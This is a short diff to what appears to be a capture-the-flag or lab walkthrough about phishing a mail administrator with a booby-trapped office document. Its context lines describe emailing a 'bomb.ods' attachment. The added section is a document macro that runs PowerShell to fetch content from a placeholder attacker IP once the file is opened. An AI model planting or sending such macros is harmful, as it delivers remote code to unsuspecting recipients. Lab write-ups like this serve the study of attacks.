@@ -103,4 +103,10 @@ sendemail -f 'jonas@localhost' \
 ```
 In this command, we send an email to mailadmin@localhost containing our bomb.ods attachment. After sending that email, all that remains is to wait (it can take up to five minutes).
 
+# ODT File - VBS file
+```
+Sub Main
+  Shell("cmd /c powershell iwr <ip>")
+End Sub
+```
 
